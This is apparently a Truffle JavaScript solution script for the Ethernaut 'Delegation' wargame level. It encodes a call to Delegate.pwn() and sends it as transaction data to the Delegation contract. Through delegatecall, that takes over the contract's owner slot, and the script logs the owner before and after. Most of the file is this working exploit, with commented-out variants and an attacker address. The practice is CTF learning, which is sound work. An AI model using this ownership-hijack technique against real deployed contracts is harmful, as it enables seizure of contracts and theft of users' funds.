module.exports = function (callback) {
    const Delegate = artifacts.require("Delegate");
    const Delegation = artifacts.require("Delegation");
    //ropsten
    let attacker_address = "0x30c947301d4344091fac586c5dd1dba97385f5bb"
    //ganache
    //let attacker_address = "0x900a66Bcfb7F99592d9d1D022F16513595BC57B7";
    let owner_address = "0xd014958E18CE9f4Ae8d2eFfD131d692223360281";
    // Okay we want to send ether from the attacker's address to Delegation, with Delegate.pwn() as the data.

    /* let pwn_encoded = web3.eth.abi.encodeFunctionCall({
        name: 'pwn',
        type: 'function',
        });
 */
    function transact(contractFunction, params, contractType) {
        contractType.deployed().then(function (instance) {
            meta = instance;
            return meta[contractFunction](...params);
        }).then(function (result) {
            console.log(result);
        }).catch(function (e) {
            console.log("error: " + e);
            //error
        })
    }

   /*  transact("owner", {
        from: attacker_address
    }, Delegation); */

    /* Delegation.deployed().then(function (instance) {
        instance.sendTransaction({from: attacker_address, value: web3.toWei(.001, 'ether'), data: pwn_encoded});
    });
 */

 /*    Delegation.deployed().then(function (instance) {
        instance.sendTransaction({
            from: attacker_address,
            value: web3.toWei(.001, 'ether')
        });
    }); */

    function functionData(contract, functionName, parameters){ 
        let abi = web3.eth.contract(contract.abi);
        let w3Contract = abi.at(contract.address);
        if (parameters != undefined){
            return w3Contract[functionName].getData(...parameters);
        } else {
            return w3Contract[functionName].getData();
        }
    }

    function sleep(ms) {
        return new Promise(resolve => {
            setTimeout(resolve, ms)
        })
    }
    async function guess() {
        let instance = await Delegation.deployed();
        let delegate = await Delegate.deployed();
        //ganache
        let vulnerable = instance;
        //let vulnerable = await CoinFlip.at("0x16f64cd939006ec899f50c6aa559ec5f29f1ccbb");
        //ropsten
        //let vulnerable = await CoinFlip.at("0xd780f39c1bc867e35825e9a63d23a17072d7030d");

        contract_side = await vulnerable["owner"]({
            from: attacker_address
        });

        fdata = functionData(delegate,'pwn');
        console.log(fdata);
        console.log(typeof fdata);
        console.log("\nOur owner before sending: " + contract_side);
    /*     vulnerable.sendTransaction({
            from: attacker_address,
            value: web3.toWei(.001, 'ether'),
            data: fdata,
            gas: 50000
        }).catch(function(error){
            console.log(error)
        }); */
        web3.eth.sendTransaction({to: vulnerable.address, gas: 50000, data: fdata, from: attacker_address},
        function(error,result){
            console.log(error + result)
        });
       /*  let flip_result = await vulnerable[""](contract_side, {
            from: attacker_address,
            value: web3.toWei(.001,'ether')
        }).catch(function(error){
            console.log(error)});

             */

        /* instance.send(web3.toWei(.001, "ether")).then    (function(result) {
            console.log(result);
        }).catch(function(error){
            console.log(error);
        }); */

        contract_side = await vulnerable["owner"]({
            from: attacker_address
        });
        console.log("\nOur owner after sending: " + contract_side);

        /* await transact("flip", [contract_side,{
            from: attacker_address
        }]); */

       /*  let flip_result = await vulnerable["flip"](contract_side, {
            from: attacker_address
        });
        console.log(flip_result); */
  
    }
    guess();
}
